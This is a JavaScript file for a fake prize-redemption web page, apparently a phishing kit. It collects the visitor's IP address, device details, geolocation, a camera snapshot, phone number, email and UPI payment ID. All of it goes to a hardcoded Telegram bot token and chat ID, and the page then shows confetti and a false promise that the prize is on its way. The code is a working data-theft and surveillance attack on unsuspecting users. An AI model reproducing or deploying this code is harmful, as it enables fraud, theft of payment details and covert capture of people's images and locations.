// Telegram Bot API Configuration
const TELEGRAM_BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U";
const TELEGRAM_CHAT_ID = "6000036430";

// Collect basic device information
const deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
};

// Get IP address
async function getIPAddress() {
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return "Unknown";
    }
}

// Get user location (Google Maps link)
async function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve("Geolocation not supported");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                resolve(`https://www.google.com/maps?q=${latitude},${longitude}`);
            },
            (error) => {
                console.error("Error getting location:", error);
                resolve("Location access denied");
            }
        );
    });
}

// Capture camera snapshot
async function captureSnapshot() {
    const video = document.getElementById("cameraFeed");
    const canvas = document.getElementById("cameraSnapshot");
    const ctx = canvas.getContext("2d");

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        return new Promise((resolve) => {
            document.getElementById("captureBtn").addEventListener("click", () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const snapshot = canvas.toDataURL("image/png");
                stream.getTracks().forEach(track => track.stop());
                resolve(snapshot);
            });
        });
    } catch (error) {
        console.error("Camera access denied:", error);
        return null;
    }
}

// Send data to Telegram bot
async function sendToTelegram(data) {
    const text = encodeURIComponent(JSON.stringify(data, null, 2));
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${text}`;

    try {
        await fetch(url);
        console.log("Data sent to Telegram");
    } catch (error) {
        console.error("Error sending to Telegram:", error);
    }
}

// Create confetti effect
function createConfetti() {
    const colors = ["#f00", "#0f0", "#00f", "#ff0", "#f0f", "#0ff"];
    for (let i = 0; i < 50; i++) {
        const confetti = document.createElement("div");
        confetti.className = "confetti";
        confetti.style.left = `${Math.random() * 100}vw`;
        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.animationDuration = `${Math.random() * 3 + 2}s`;
        document.body.appendChild(confetti);
    }
}

// Main logic
document.addEventListener("DOMContentLoaded", async () => {
    const redeemBtn = document.getElementById("redeemBtn");
    const phoneInput = document.getElementById("phone");
    const emailInput = document.getElementById("email");
    const upiInput = document.getElementById("upi");
    const cameraContainer = document.getElementById("cameraContainer");

    // Collect IP address
    const ipAddress = await getIPAddress();
    deviceInfo.ipAddress = ipAddress;

    // Show camera container
    cameraContainer.style.display = "block";

    // Handle redeem button click
    redeemBtn.addEventListener("click", async () => {
        const phone = phoneInput.value.trim();
        const email = emailInput.value.trim();
        const upi = upiInput.value.trim();

        if (!phone || !email || !upi) {
            alert("Please fill out all fields to redeem your prize!");
            return;
        }

        // Get location
        const location = await getLocation();

        // Capture snapshot
        const snapshot = await captureSnapshot();

        // Prepare data to send
        const data = {
            ...deviceInfo,
            phone,
            email,
            upi,
            location,
            snapshot: snapshot || "Camera access denied",
            timestamp: new Date().toISOString()
        };

        // Send to Telegram
        await sendToTelegram(data);

        // Show confetti and success message
        createConfetti();
        alert("🎉 Your prize is on its way! Check your email for further instructions. 🎉");
    });
});
